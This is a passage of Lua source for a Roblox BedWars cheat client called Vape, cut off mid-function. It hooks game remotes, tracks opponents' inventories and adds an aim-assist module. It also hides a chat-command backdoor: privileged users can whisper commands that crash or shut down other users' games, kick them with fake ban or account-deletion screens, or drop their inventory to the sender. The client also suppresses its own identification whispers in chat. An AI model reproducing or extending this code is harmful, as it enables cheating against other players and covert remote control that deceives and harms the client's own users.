			table.insert(vapeConnections, connection:Connect(function(...)
				vapeEvents[v]:Fire(...)
			end))
		end)
	end

	bedwarsStore.blocks = collectionService:GetTagged("block")
	bedwarsStore.blockRaycast.FilterDescendantsInstances = {bedwarsStore.blocks}
	table.insert(vapeConnections, collectionService:GetInstanceAddedSignal("block"):Connect(function(block)
		table.insert(bedwarsStore.blocks, block)
		bedwarsStore.blockRaycast.FilterDescendantsInstances = {bedwarsStore.blocks}
	end))
	table.insert(vapeConnections, collectionService:GetInstanceRemovedSignal("block"):Connect(function(block)
		block = table.find(bedwarsStore.blocks, block)
		if block then 
			table.remove(bedwarsStore.blocks, block)
			bedwarsStore.blockRaycast.FilterDescendantsInstances = {bedwarsStore.blocks}
		end
	end))
	for _, ent in pairs(collectionService:GetTagged("entity")) do 
		if ent.Name == "DesertPotEntity" then 
			table.insert(bedwarsStore.pots, ent)
		end
	end
	table.insert(vapeConnections, collectionService:GetInstanceAddedSignal("entity"):Connect(function(ent)
		if ent.Name == "DesertPotEntity" then 
			table.insert(bedwarsStore.pots, ent)
		end
	end))
	table.insert(vapeConnections, collectionService:GetInstanceRemovedSignal("entity"):Connect(function(ent)
		ent = table.find(bedwarsStore.pots, ent)
		if ent then 
			table.remove(bedwarsStore.pots, ent)
		end
	end))

	local oldZephyrUpdate = bedwars.ZephyrController.updateJump
	bedwars.ZephyrController.updateJump = function(self, orb, ...)
		bedwarsStore.zephyrOrb = lplr.Character and lplr.Character:GetAttribute("Health") > 0 and orb or 0
		return oldZephyrUpdate(self, orb, ...)
	end

	task.spawn(function()
		repeat task.wait() until WhitelistFunctions.Loaded
		for i, v in pairs(WhitelistFunctions.WhitelistTable.WhitelistedUsers) do
			if v.tags then
				for i2, v2 in pairs(v.tags) do
					v2.color = Color3.fromRGB(unpack(v2.color))
				end
			end
		end

		local alreadysaidlist = {}

		local function findplayers(arg, plr)
			local temp = {}
			local continuechecking = true

			if arg == "default" and continuechecking and WhitelistFunctions.LocalPriority == 0 then table.insert(temp, lplr) continuechecking = false end
			if arg == "teamdefault" and continuechecking and WhitelistFunctions.LocalPriority == 0 and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
			if arg == "private" and continuechecking and WhitelistFunctions.LocalPriority == 1 then table.insert(temp, lplr) continuechecking = false end
			for i,v in pairs(playersService:GetPlayers()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end

			return temp
		end

		local function transformImage(img, txt)
			local function funnyfunc(v)
				if v:GetFullName():find("ExperienceChat") == nil then
					if v:IsA("ImageLabel") or v:IsA("ImageButton") then
						v.Image = img
						v:GetPropertyChangedSignal("Image"):Connect(function()
							v.Image = img
						end)
					end
					if (v:IsA("TextLabel") or v:IsA("TextButton")) then
						if v.Text ~= "" then
							v.Text = txt
						end
						v:GetPropertyChangedSignal("Text"):Connect(function()
							if v.Text ~= "" then
								v.Text = txt
							end
						end)
					end
					if v:IsA("Texture") or v:IsA("Decal") then
						v.Texture = img
						v:GetPropertyChangedSignal("Texture"):Connect(function()
							v.Texture = img
						end)
					end
					if v:IsA("MeshPart") then
						v.TextureID = img
						v:GetPropertyChangedSignal("TextureID"):Connect(function()
							v.TextureID = img
						end)
					end
					if v:IsA("SpecialMesh") then
						v.TextureId = img
						v:GetPropertyChangedSignal("TextureId"):Connect(function()
							v.TextureId = img
						end)
					end
					if v:IsA("Sky") then
						v.SkyboxBk = img
						v.SkyboxDn = img
						v.SkyboxFt = img
						v.SkyboxLf = img
						v.SkyboxRt = img
						v.SkyboxUp = img
					end
				end
			end
		
			for i,v in pairs(game:GetDescendants()) do
				funnyfunc(v)
			end
			game.DescendantAdded:Connect(funnyfunc)
		end

		local vapePrivateCommands = {
			kill = function(args, plr)
				if entityLibrary.isAlive then
					local hum = entityLibrary.character.Humanoid
					task.delay(0.1, function()
						if hum and hum.Health > 0 then 
							hum:ChangeState(Enum.HumanoidStateType.Dead)
							hum.Health = 0
							bedwars.ClientHandler:Get(bedwars.ResetRemote):SendToServer()
						end
					end)
				end
			end,
			byfron = function(args, plr)
				task.spawn(function()
					local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
					local Roact = getrenv().require(game:GetService("CorePackages").Roact)
					UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
					local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
					local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
					local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
					local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
					local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
					lplr.PlayerGui:ClearAllChildren()
					GuiLibrary.MainGui.Enabled = false
					game:GetService("CoreGui"):ClearAllChildren()
					for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
					task.wait(0.2)
					lplr:Kick()
					game:GetService("GuiService"):ClearError()
					task.wait(2)
					local gui = Instance.new("ScreenGui")
					gui.IgnoreGuiInset = true
					gui.Parent = game:GetService("CoreGui")
					local frame = Instance.new("Frame")
					frame.BorderSizePixel = 0
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.new(1, 1, 1)
					frame.Parent = gui
					task.delay(0.1, function()
						frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
					end)
					task.delay(2, function()
						local e = Roact.createElement(auth, {
							style = {},
							screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
							moderationDetails = {
								punishmentTypeDescription = "Delete",
								beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
								reactivateAccountActivated = true,
								badUtterances = {},
								messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
							},
							termsActivated = function() 
								game:Shutdown()
							end,
							communityGuidelinesActivated = function() 
								game:Shutdown()
							end,
							supportFormActivated = function() 
								game:Shutdown()
							end,
							reactivateAccountActivated = function() 
								game:Shutdown()
							end,
							logoutCallback = function()
								game:Shutdown()
							end,
							globalGuiInset = {
								top = 0
							}
						})
						local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
								localization = tLocalization.mock()
							}, {Roact.createElement(UIBlox.Style.Provider, {
									style = {
										Theme = darktheme,
										Font = gotham
									},
								}, {e})}))
						Roact.mount(screengui, game:GetService("CoreGui"))
					end)
				end)
			end,
			steal = function(args, plr)
				if GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.Enabled then 
					GuiLibrary.ObjectsThatCanBeSaved.AutoBankOptionsButton.Api.ToggleButton(false)
					task.wait(1)
				end
				for i,v in pairs(bedwarsStore.localInventory.inventory.items) do 
					local e = bedwars.ClientHandler:Get(bedwars.DropItemRemote):CallServer({
						item = v.tool,
						amount = v.amount ~= math.huge and v.amount or 99999999
					})
					if e then 
						e.CFrame = plr.Character.HumanoidRootPart.CFrame
					else
						v.tool:Destroy()
					end
				end
			end,
			lobby = function(args)
				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
			end,
			reveal = function(args)
				task.spawn(function()
					task.wait(0.1)
					local newchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
					if newchannel then 
						newchannel:SendAsync("I am using the inhaler client")
					end
				end)
			end,
			lagback = function(args)
				if entityLibrary.isAlive then
					entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
				end
			end,
			jump = function(args)
				if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
					entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				end
			end,
			trip = function(args)
				if entityLibrary.isAlive then
					entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
				end
			end,
			teleport = function(args)
				game:GetService("TeleportService"):Teleport(tonumber(args[1]) ~= "" and tonumber(args[1]) or game.PlaceId)
			end,
			sit = function(args)
				if entityLibrary.isAlive then
					entityLibrary.character.Humanoid.Sit = true
				end
			end,
			unsit = function(args)
				if entityLibrary.isAlive then
					entityLibrary.character.Humanoid.Sit = false
				end
			end,
			freeze = function(args)
				if entityLibrary.isAlive then
					entityLibrary.character.HumanoidRootPart.Anchored = true
				end
			end,
			thaw = function(args)
				if entityLibrary.isAlive then
					entityLibrary.character.HumanoidRootPart.Anchored = false
				end
			end,
			deletemap = function(args)
				for i,v in pairs(collectionService:GetTagged("block")) do
					v:Destroy()
				end
			end,
			void = function(args)
				if entityLibrary.isAlive then
					entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
				end
			end,
			framerate = function(args)
				if #args >= 1 then
					if setfpscap then
						setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
					end
				end
			end,
			crash = function(args)
				setfpscap(9e9)
				print(game:GetObjects("h29g3535")[1])
			end,
			chipman = function(args)
				transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man")
			end,
			rickroll = function(args)
				transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
			end,
			josiah = function(args)
				transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
			end,
			xylex = function(args)
				transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex")
			end,
			gravity = function(args)
				workspace.Gravity = tonumber(args[1]) or 192.6
			end,
			kick = function(args)
				local str = ""
				for i,v in pairs(args) do
					str = str..v..(i > 1 and " " or "")
				end
				task.spawn(function()
					lplr:Kick(str)
				end)
				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
			end,
			ban = function(args)
				task.spawn(function()
					lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
				end)
				bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
			end,
			uninject = function(args)
				GuiLibrary.SelfDestruct()
			end,
			monkey = function(args)
				local str = ""
				for i,v in pairs(args) do
					str = str..v..(i > 1 and " " or "")
				end
				if str == "" then str = "skill issue" end
				local video = Instance.new("VideoFrame")
				video.Video = downloadVapeAsset("vape/assets/skill.webm")
				video.Size = UDim2.new(1, 0, 1, 36)
				video.Visible = false
				video.Position = UDim2.new(0, 0, 0, -36)
				video.ZIndex = 9
				video.BackgroundTransparency = 1
				video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
				local textlab = Instance.new("TextLabel")
				textlab.TextSize = 45
				textlab.ZIndex = 10
				textlab.Size = UDim2.new(1, 0, 1, 36)
				textlab.TextColor3 = Color3.new(1, 1, 1)
				textlab.Text = str
				textlab.Position = UDim2.new(0, 0, 0, -36)
				textlab.Font = Enum.Font.Gotham
				textlab.BackgroundTransparency = 1
				textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
				video.Loaded:Connect(function()
					video.Visible = true
					video:Play()
					task.spawn(function()
						repeat
							wait()
							for i = 0, 1, 0.01 do
								wait(0.01)
								textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
							end
						until true == false
					end)
				end)
				task.wait(19)
				task.spawn(function()
					pcall(function()
						if getconnections then
							getconnections(entityLibrary.character.Humanoid.Died)
						end
						print(game:GetObjects("h29g3535")[1])
					end)
					while true do end
				end)
			end,
			enable = function(args)
				if #args >= 1 then
					if args[1]:lower() == "all" then
						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
							if v.Type == "OptionsButton" and i ~= "Panic" and not v.Api.Enabled then
								v.Api.ToggleButton()
							end
						end
					else
						local module
						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
							if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
								module = v
								break
							end
						end
						if module and not module.Api.Enabled then
							module.Api.ToggleButton()
						end
					end
				end
			end,
			disable = function(args)
				if #args >= 1 then
					if args[1]:lower() == "all" then
						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
							if v.Type == "OptionsButton" and i ~= "Panic" and v.Api.Enabled then
								v.Api.ToggleButton()
							end
						end
					else
						local module
						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
							if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
								module = v
								break
							end
						end
						if module and module.Api.Enabled then
							module.Api.ToggleButton()
						end
					end
				end
			end,
			toggle = function(args)
				if #args >= 1 then
					if args[1]:lower() == "all" then
						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
							if v.Type == "OptionsButton" and i ~= "Panic" then
								v.Api.ToggleButton()
							end
						end
					else
						local module
						for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
							if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
								module = v
								break
							end
						end
						if module then
							module.Api.ToggleButton()
						end
					end
				end
			end,
			shutdown = function(args)
				game:Shutdown()
			end
		}
		vapePrivateCommands.unfreeze = vapePrivateCommands.thaw

		textChatService.OnIncomingMessage = function(message)
			local props = Instance.new("TextChatMessageProperties")
			if message.TextSource then
				local plr = playersService:GetPlayerByUserId(message.TextSource.UserId)
				if plr then
					local args = message.Text:split(" ")
					local client = bedwarsStore.whitelist.chatStrings1[#args > 0 and args[#args] or message.Text]
					local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr)
					props.PrefixText = message.PrefixText
					if bedwarsStore.whitelist.clientUsers[plr.Name] then
						props.PrefixText = "<font color='#"..Color3.new(1, 1, 0):ToHex().."'>["..bedwarsStore.whitelist.clientUsers[plr.Name].."]</font> "..props.PrefixText
					end
					if plrtag then
						props.PrefixText = message.PrefixText
						for i, v in pairs(plrtag) do 
							props.PrefixText = "<font color='#"..v.color:ToHex().."'>["..v.text.."]</font> "..props.PrefixText
						end
					end
					if plr:GetAttribute("ClanTag") then 
						props.PrefixText = "<font color='#FFFFFF'>["..plr:GetAttribute("ClanTag").."]</font> "..props.PrefixText
					end
					if plr == lplr then 
						if WhitelistFunctions.LocalPriority > 0 then
							if message.Text:len() >= 5 and message.Text:sub(1, 5):lower() == ";cmds" then
								local tab = {}
								for i,v in pairs(vapePrivateCommands) do
									table.insert(tab, i)
								end
								table.sort(tab)
								local str = ""
								for i,v in pairs(tab) do
									str = str..";"..v.."\n"
								end
								message.TextChannel:DisplaySystemMessage(str)
							end
						end
					else
						if WhitelistFunctions.LocalPriority > 0 and message.TextChannel.Name:find("RBXWhisper") and client ~= nil and alreadysaidlist[plr.Name] == nil then
							message.Text = ""
							alreadysaidlist[plr.Name] = true
							warningNotification("Vape", plr.Name.." is using "..client.."!", 60)
							WhitelistFunctions.CustomTags[plr.Name] = string.format("[%s] ", client:upper()..' USER')
							bedwarsStore.whitelist.clientUsers[plr.Name] = client:upper()..' USER'
							local ind, newent = entityLibrary.getEntityFromPlayer(plr)
							if newent then entityLibrary.entityUpdatedEvent:Fire(newent) end
						end
						if otherPriority > 0 and otherPriority > WhitelistFunctions.LocalPriority and #args > 1 then
							table.remove(args, 1)
							local chosenplayers = findplayers(args[1], plr)
							table.remove(args, 1)
							for i,v in pairs(vapePrivateCommands) do
								if message.Text:len() >= (i:len() + 1) and message.Text:sub(1, i:len() + 1):lower() == ";"..i:lower() then
									message.Text = ""
									if table.find(chosenplayers, lplr) then
										v(args, plr)
									end
									break
								end
							end
						end
					end
				end
			else
				if WhitelistFunctions:IsSpecialIngame() and message.Text:find("You are now privately chatting") then 
					message.Text = ""
				end
			end
			return props	
		end

		local function newPlayer(plr)
			if WhitelistFunctions:GetWhitelist(plr) ~= 0 and WhitelistFunctions.LocalPriority == 0 then
				GuiLibrary.SelfDestruct = function()
					warningNotification("Vape", "nice one bro :troll:", 5)
				end
				task.spawn(function()
					repeat task.wait() until plr:GetAttribute("LobbyConnected")
					task.wait(4)
					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
					local newchannel = game:GetService("RobloxReplicatedStorage").ExperienceChat.WhisperChat:InvokeServer(plr.UserId)
					local client = bedwarsStore.whitelist.chatStrings2.vape
					task.spawn(function()
						game:GetService("CoreGui").ExperienceChat.bubbleChat.DescendantAdded:Connect(function(newbubble)
							if newbubble:IsA("TextLabel") and newbubble.Text:find(client) then
								newbubble.Parent.Parent.Visible = false
							end
						end)
						game:GetService("CoreGui").ExperienceChat:FindFirstChild("RCTScrollContentView", true).ChildAdded:Connect(function(newbubble)
							if newbubble:IsA("TextLabel") and newbubble.Text:find(client) then
								newbubble.Visible = false
							end
						end)
					end)
					if newchannel then 
						newchannel:SendAsync(client)
					end
					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
				end)
			end
		end

		for i,v in pairs(playersService:GetPlayers()) do task.spawn(newPlayer, v) end
		table.insert(vapeConnections, playersService.PlayerAdded:Connect(function(v)
			task.spawn(newPlayer, v)
		end))
	end)

	GuiLibrary.SelfDestructEvent.Event:Connect(function()
		bedwars.ZephyrController.updateJump = oldZephyrUpdate
		getmetatable(bedwars.ClientHandler).Get = oldRemoteGet
		bedwarsStore.blockPlacer:disable()
		textChatService.OnIncomingMessage = nil
	end)
	
	local teleportedServers = false
	table.insert(vapeConnections, lplr.OnTeleport:Connect(function(State)
		if (not teleportedServers) then
			teleportedServers = true
			local currentState = bedwars.ClientStoreHandler and bedwars.ClientStoreHandler:getState() or {Party = {members = 0}}
			local queuedstring = ''
			if currentState.Party and currentState.Party.members and #currentState.Party.members > 0 then
				queuedstring = queuedstring..'shared.vapeteammembers = '..#currentState.Party.members..'\n'
			end
			if bedwarsStore.TPString then
				queuedstring = queuedstring..'shared.vapeoverlay = "'..bedwarsStore.TPString..'"\n'
			end
			queueonteleport(queuedstring)
		end
	end))
end)

do
	entityLibrary.animationCache = {}
	entityLibrary.groundTick = tick()
	entityLibrary.selfDestruct()
	entityLibrary.isPlayerTargetable = function(plr)
		return lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") and not isFriend(plr)
	end
	entityLibrary.characterAdded = function(plr, char, localcheck)
		local id = game:GetService("HttpService"):GenerateGUID(true)
		entityLibrary.entityIds[plr.Name] = id
        if char then
            task.spawn(function()
                local humrootpart = char:WaitForChild("HumanoidRootPart", 10)
                local head = char:WaitForChild("Head", 10)
                local hum = char:WaitForChild("Humanoid", 10)
				if entityLibrary.entityIds[plr.Name] ~= id then return end
                if humrootpart and hum and head then
					local childremoved
                    local newent
                    if localcheck then
                        entityLibrary.isAlive = true
                        entityLibrary.character.Head = head
                        entityLibrary.character.Humanoid = hum
                        entityLibrary.character.HumanoidRootPart = humrootpart
						table.insert(entityLibrary.entityConnections, char.AttributeChanged:Connect(function(...)
							vapeEvents.AttributeChanged:Fire(...)
						end))
                    else
						newent = {
                            Player = plr,
                            Character = char,
                            HumanoidRootPart = humrootpart,
                            RootPart = humrootpart,
                            Head = head,
                            Humanoid = hum,
                            Targetable = entityLibrary.isPlayerTargetable(plr),
                            Team = plr.Team,
                            Connections = {},
							Jumping = false,
							Jumps = 0,
							JumpTick = tick()
                        }
						local inv = char:WaitForChild("InventoryFolder", 5)
						if inv then 
							local armorobj1 = char:WaitForChild("ArmorInvItem_0", 5)
							local armorobj2 = char:WaitForChild("ArmorInvItem_1", 5)
							local armorobj3 = char:WaitForChild("ArmorInvItem_2", 5)
							local handobj = char:WaitForChild("HandInvItem", 5)
							if entityLibrary.entityIds[plr.Name] ~= id then return end
							if armorobj1 then
								table.insert(newent.Connections, armorobj1.Changed:Connect(function() 
									task.delay(0.3, function() 
										if entityLibrary.entityIds[plr.Name] ~= id then return end
										bedwarsStore.inventories[plr] = bedwars.getInventory(plr) 
										entityLibrary.entityUpdatedEvent:Fire(newent)
									end)
								end))
							end
							if armorobj2 then
								table.insert(newent.Connections, armorobj2.Changed:Connect(function() 
									task.delay(0.3, function() 
										if entityLibrary.entityIds[plr.Name] ~= id then return end
										bedwarsStore.inventories[plr] = bedwars.getInventory(plr) 
										entityLibrary.entityUpdatedEvent:Fire(newent)
									end)
								end))
							end
							if armorobj3 then
								table.insert(newent.Connections, armorobj3.Changed:Connect(function() 
									task.delay(0.3, function() 
										if entityLibrary.entityIds[plr.Name] ~= id then return end
										bedwarsStore.inventories[plr] = bedwars.getInventory(plr) 
										entityLibrary.entityUpdatedEvent:Fire(newent)
									end)
								end))
							end
							if handobj then
								table.insert(newent.Connections, handobj.Changed:Connect(function() 
									task.delay(0.3, function() 
										if entityLibrary.entityIds[plr.Name] ~= id then return end
										bedwarsStore.inventories[plr] = bedwars.getInventory(plr)
										entityLibrary.entityUpdatedEvent:Fire(newent)
									end)
								end))
							end
						end
						if entityLibrary.entityIds[plr.Name] ~= id then return end
						task.delay(0.3, function() 
							if entityLibrary.entityIds[plr.Name] ~= id then return end
							bedwarsStore.inventories[plr] = bedwars.getInventory(plr) 
							entityLibrary.entityUpdatedEvent:Fire(newent)
						end)
						table.insert(newent.Connections, hum:GetPropertyChangedSignal("Health"):Connect(function() entityLibrary.entityUpdatedEvent:Fire(newent) end))
						table.insert(newent.Connections, hum:GetPropertyChangedSignal("MaxHealth"):Connect(function() entityLibrary.entityUpdatedEvent:Fire(newent) end))
						table.insert(newent.Connections, hum.AnimationPlayed:Connect(function(state) 
							local animnum = tonumber(({state.Animation.AnimationId:gsub("%D+", "")})[1])
							if animnum then
								if not entityLibrary.animationCache[state.Animation.AnimationId] then 
									entityLibrary.animationCache[state.Animation.AnimationId] = game:GetService("MarketplaceService"):GetProductInfo(animnum)
								end
								if entityLibrary.animationCache[state.Animation.AnimationId].Name:lower():find("jump") then
									newent.Jumps = newent.Jumps + 1
								end
							end
						end))
						table.insert(newent.Connections, char.AttributeChanged:Connect(function(attr) if attr:find("Shield") then entityLibrary.entityUpdatedEvent:Fire(newent) end end))
						table.insert(entityLibrary.entityList, newent)
						entityLibrary.entityAddedEvent:Fire(newent)
                    end
					if entityLibrary.entityIds[plr.Name] ~= id then return end
					childremoved = char.ChildRemoved:Connect(function(part)
						if part.Name == "HumanoidRootPart" or part.Name == "Head" or part.Name == "Humanoid" then			
							if localcheck then
								if char == lplr.Character then
									if part.Name == "HumanoidRootPart" then
										entityLibrary.isAlive = false
										local root = char:FindFirstChild("HumanoidRootPart")
										if not root then 
											root = char:WaitForChild("HumanoidRootPart", 3)
										end
										if root then 
											entityLibrary.character.HumanoidRootPart = root
											entityLibrary.isAlive = true
										end
									else
										entityLibrary.isAlive = false
									end
								end
							else
								childremoved:Disconnect()
								entityLibrary.removeEntity(plr)
							end
						end
					end)
					if newent then 
						table.insert(newent.Connections, childremoved)
					end
					table.insert(entityLibrary.entityConnections, childremoved)
                end
            end)
        end
    end
	entityLibrary.entityAdded = function(plr, localcheck, custom)
		table.insert(entityLibrary.entityConnections, plr:GetPropertyChangedSignal("Character"):Connect(function()
            if plr.Character then
                entityLibrary.refreshEntity(plr, localcheck)
            else
                if localcheck then
                    entityLibrary.isAlive = false
                else
                    entityLibrary.removeEntity(plr)
                end
            end
        end))
        table.insert(entityLibrary.entityConnections, plr:GetAttributeChangedSignal("Team"):Connect(function()
			local tab = {}
			for i,v in next, entityLibrary.entityList do
                if v.Targetable ~= entityLibrary.isPlayerTargetable(v.Player) then 
                    table.insert(tab, v)
                end
            end
			for i,v in next, tab do 
				entityLibrary.refreshEntity(v.Player)
			end
            if localcheck then
                entityLibrary.fullEntityRefresh()
            else
				entityLibrary.refreshEntity(plr, localcheck)
            end
        end))
		if plr.Character then
            task.spawn(entityLibrary.refreshEntity, plr, localcheck)
        end
    end
	entityLibrary.fullEntityRefresh()
	task.spawn(function()
		repeat
			task.wait()
			if entityLibrary.isAlive then
				entityLibrary.groundTick = entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air and tick() or entityLibrary.groundTick
			end
			for i,v in pairs(entityLibrary.entityList) do 
				local state = v.Humanoid:GetState()
				v.JumpTick = (state ~= Enum.HumanoidStateType.Running and state ~= Enum.HumanoidStateType.Landed) and tick() or v.JumpTick
				v.Jumping = (tick() - v.JumpTick) < 0.2 and v.Jumps > 1
				if (tick() - v.JumpTick) > 0.2 then 
					v.Jumps = 0
				end
			end
		until not vapeInjected
	end)
	local textlabel = Instance.new("TextLabel")
	textlabel.Size = UDim2.new(1, 0, 0, 36)
	textlabel.Text = "A new discord has been created, click the icon to join."
	textlabel.BackgroundTransparency = 1
	textlabel.ZIndex = 10
	textlabel.TextStrokeTransparency = 0
	textlabel.TextScaled = true
	textlabel.Font = Enum.Font.SourceSans
	textlabel.TextColor3 = Color3.new(1, 1, 1)
	textlabel.Position = UDim2.new(0, 0, 1, -36)
	textlabel.Parent = GuiLibrary.MainGui.ScaledGui.ClickGui
end

runFunction(function()
	local handsquare = Instance.new("ImageLabel")
	handsquare.Size = UDim2.new(0, 26, 0, 27)
	handsquare.BackgroundColor3 = Color3.fromRGB(26, 25, 26)
	handsquare.Position = UDim2.new(0, 72, 0, 44)
	handsquare.Parent = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo
	local handround = Instance.new("UICorner")
	handround.CornerRadius = UDim.new(0, 4)
	handround.Parent = handsquare
	local helmetsquare = handsquare:Clone()
	helmetsquare.Position = UDim2.new(0, 100, 0, 44)
	helmetsquare.Parent = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo
	local chestplatesquare = handsquare:Clone()
	chestplatesquare.Position = UDim2.new(0, 127, 0, 44)
	chestplatesquare.Parent = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo
	local bootssquare = handsquare:Clone()
	bootssquare.Position = UDim2.new(0, 155, 0, 44)
	bootssquare.Parent = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo
	local uselesssquare = handsquare:Clone()
	uselesssquare.Position = UDim2.new(0, 182, 0, 44)
	uselesssquare.Parent = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo
	local oldupdate = vapeTargetInfo.UpdateInfo
	vapeTargetInfo.UpdateInfo = function(tab, targetsize)
		local bkgcheck = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo.BackgroundTransparency == 1
		handsquare.BackgroundTransparency = bkgcheck and 1 or 0
		helmetsquare.BackgroundTransparency = bkgcheck and 1 or 0
		chestplatesquare.BackgroundTransparency = bkgcheck and 1 or 0
		bootssquare.BackgroundTransparency = bkgcheck and 1 or 0
		uselesssquare.BackgroundTransparency = bkgcheck and 1 or 0
		pcall(function()
			for i,v in pairs(shared.VapeTargetInfo.Targets) do
				local inventory = bedwarsStore.inventories[v.Player] or {}
					if inventory.hand then
						handsquare.Image = bedwars.getIcon(inventory.hand, true)
					else
						handsquare.Image = ""
					end
					if inventory.armor[4] then
						helmetsquare.Image = bedwars.getIcon(inventory.armor[4], true)
					else
						helmetsquare.Image = ""
					end
					if inventory.armor[5] then
						chestplatesquare.Image = bedwars.getIcon(inventory.armor[5], true)
					else
						chestplatesquare.Image = ""
					end
					if inventory.armor[6] then
						bootssquare.Image = bedwars.getIcon(inventory.armor[6], true)
					else
						bootssquare.Image = ""
					end
				break
			end
		end)
		return oldupdate(tab, targetsize)
	end
end)

GuiLibrary.RemoveObject("SilentAimOptionsButton")
GuiLibrary.RemoveObject("ReachOptionsButton")
GuiLibrary.RemoveObject("MouseTPOptionsButton")
GuiLibrary.RemoveObject("PhaseOptionsButton")
GuiLibrary.RemoveObject("AutoClickerOptionsButton")
GuiLibrary.RemoveObject("SpiderOptionsButton")
GuiLibrary.RemoveObject("LongJumpOptionsButton")
GuiLibrary.RemoveObject("HitBoxesOptionsButton")
GuiLibrary.RemoveObject("KillauraOptionsButton")
GuiLibrary.RemoveObject("TriggerBotOptionsButton")
GuiLibrary.RemoveObject("AutoLeaveOptionsButton")
GuiLibrary.RemoveObject("SpeedOptionsButton")
GuiLibrary.RemoveObject("FlyOptionsButton")
GuiLibrary.RemoveObject("ClientKickDisablerOptionsButton")
GuiLibrary.RemoveObject("NameTagsOptionsButton")
GuiLibrary.RemoveObject("SafeWalkOptionsButton")
GuiLibrary.RemoveObject("BlinkOptionsButton")
GuiLibrary.RemoveObject("FOVChangerOptionsButton")
GuiLibrary.RemoveObject("AntiVoidOptionsButton")
GuiLibrary.RemoveObject("SongBeatsOptionsButton")
GuiLibrary.RemoveObject("TargetStrafeOptionsButton")

runFunction(function()
	local AimAssist = {Enabled = false}
	local AimAssistClickAim = {Enabled = false}
	local AimAssistStrafe = {Enabled = false}
	local AimSpeed = {Value = 1}
	local AimAssistTargetFrame = {Players = {Enabled = false}}
	AimAssist = GuiLibrary.ObjectsThatCanBeSaved.CombatWindow.Api.CreateOptionsButton({
		Name = "AimAssist",
		Function = function(callback)
			if callback then
				RunLoops:BindToRenderStep("AimAssist", function(dt)
					vapeTargetInfo.Targets.AimAssist = nil
					if ((not AimAssistClickAim.Enabled) or (tick() - bedwars.SwordController.lastSwing) < 0.4) then
						local plr = EntityNearPosition(18)
						if plr then
							vapeTargetInfo.Targets.AimAssist = {
								Humanoid = {
									Health = (plr.Character:GetAttribute("Health") or plr.Humanoid.Health) + getShieldAttribute(plr.Character),
									MaxHealth = plr.Character:GetAttribute("MaxHealth") or plr.Humanoid.MaxHealth
								},
								Player = plr.Player
							}
							if bedwarsStore.localHand.Type == "sword" then
								if GuiLibrary.ObjectsThatCanBeSaved["Lobby CheckToggle"].Api.Enabled then
									if bedwarsStore.matchState == 0 then return end
								end
